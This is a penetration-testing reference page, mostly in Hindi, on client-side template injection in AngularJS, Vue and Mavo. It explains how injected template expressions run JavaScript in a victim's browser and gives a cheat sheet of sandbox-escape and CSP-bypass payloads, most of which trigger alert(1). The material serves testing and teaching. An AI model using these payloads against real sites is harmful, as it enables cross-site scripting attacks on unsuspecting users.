# Client Side Template Injection (CSTI)

{{#include ../banners/hacktricks-training.md}}

<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>

अपने **Mobile Security** में विशेषज्ञता को 8kSec Academy के साथ गहरा करें। हमारे आत्म-गति पाठ्यक्रमों के माध्यम से iOS और Android सुरक्षा में महारत हासिल करें और प्रमाणित हों:

{% embed url="https://academy.8ksec.io/" %}

## Summary

यह [**Server Side Template Injection**](ssti-server-side-template-injection/) की तरह है लेकिन **client** में। **SSTI** आपको **remote server** पर **code** **execute** करने की अनुमति दे सकता है, **CSTI** आपको **victim's browser** में **arbitrary JavaScript** कोड **execute** करने की अनुमति दे सकता है।

इस भेद्यता के लिए **Testing** **SSTI** के मामले में बहुत **similar** है, इंटरप्रेटर **a template** की अपेक्षा करता है और इसे **execute** करेगा। उदाहरण के लिए, एक payload जैसे `{{ 7-7 }}` के साथ, यदि ऐप **vulnerable** है तो आप `0` देखेंगे, और यदि नहीं, तो आप मूल: `{{ 7-7 }}` देखेंगे।

## AngularJS

AngularJS एक व्यापक रूप से उपयोग किया जाने वाला JavaScript फ्रेमवर्क है जो HTML के साथ निर्देशिकाओं के रूप में जाने जाने वाले गुणों के माध्यम से इंटरैक्ट करता है, एक उल्लेखनीय **`ng-app`** है। यह निर्देशिका AngularJS को HTML सामग्री को संसाधित करने की अनुमति देती है, जिससे डबल कर्ली ब्रेसेस के अंदर JavaScript अभिव्यक्तियों का निष्पादन संभव होता है।

उन परिदृश्यों में जहां उपयोगकर्ता इनपुट को `ng-app` के साथ टैग किए गए HTML बॉडी में गतिशील रूप से डाला जाता है, यह मनमाने JavaScript कोड को निष्पादित करना संभव है। यह इनपुट के भीतर AngularJS की सिंटैक्स का लाभ उठाकर किया जा सकता है। नीचे उदाहरण दिए गए हैं जो दिखाते हैं कि कैसे JavaScript कोड को निष्पादित किया जा सकता है:
```javascript
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>

<!-- Google Research - AngularJS -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```
आप इस **बुनियादी ऑनलाइन उदाहरण** को **AngularJS** में इस लिंक पर पा सकते हैं [http://jsfiddle.net/2zs2yv7o/](http://jsfiddle.net/2zs2yv7o/) और [**Burp Suite Academy**](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression) में

> [!CAUTION]
> [**Angular 1.6 ने सैंडबॉक्स हटा दिया**](http://blog.angularjs.org/2016/09/angular-16-expression-sandbox-removal.html) इसलिए इस संस्करण से एक पेलोड जैसे `{{constructor.constructor('alert(1)')()}}` या `<input ng-focus=$event.view.alert('XSS')>` काम करना चाहिए।

## VueJS

आप एक **कमजोर Vue** कार्यान्वयन इस लिंक पर पा सकते हैं [https://vue-client-side-template-injection-example.azu.now.sh/](https://vue-client-side-template-injection-example.azu.now.sh)\
काम करने वाला पेलोड: [`https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor(%27alert(%22foo%22)%27)()%7D%`](<https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor(%27alert(%22foo%22)%27)()%7D%7D>)

और कमजोर उदाहरण का **स्रोत कोड** यहाँ है: [https://github.com/azu/vue-client-side-template-injection-example](https://github.com/azu/vue-client-side-template-injection-example)
```markup
<!-- Google Research - Vue.js-->
"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//localhost/mH`')()"> aaa</div>
```
एक वास्तव में अच्छा पोस्ट CSTI पर VUE में [https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets) पाया जा सकता है

### **V3**
```
{{_openBlock.constructor('alert(1)')()}}
```
श्रेय: [Gareth Heyes, Lewis Ardern & PwnFunction](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)

### **V2**
```
{{constructor.constructor('alert(1)')()}}
```
क्रेडिट: [Mario Heiderich](https://twitter.com/cure53berlin)

**अधिक VUE पेलोड्स देखें** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected)

## Mavo

पेलोड:
```
[7*7]
[(1,alert)(1)]
<div mv-expressions="{{ }}">{{top.alert(1)}}</div>
[self.alert(1)]
javascript:alert(1)%252f%252f..%252fcss-images
[Omglol mod 1 mod self.alert (1) andlol]
[''=''or self.alert(lol)]
<a data-mv-if='1 or self.alert(1)'>test</a>
<div data-mv-expressions="lolx lolx">lolxself.alert('lol')lolx</div>
<a href=[javascript&':alert(1)']>test</a>
[self.alert(1)mod1]
```
**अधिक पेलोड्स** [**https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations**](https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations)

## **ब्रूट-फोर्स डिटेक्शन लिस्ट**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>

**मोबाइल सुरक्षा** में अपनी विशेषज्ञता को गहरा करें 8kSec अकादमी के साथ। हमारे आत्म-गति पाठ्यक्रमों के माध्यम से iOS और Android सुरक्षा में महारत हासिल करें और प्रमाणित हों:

{% embed url="https://academy.8ksec.io/" %}

{{#include ../banners/hacktricks-training.md}}
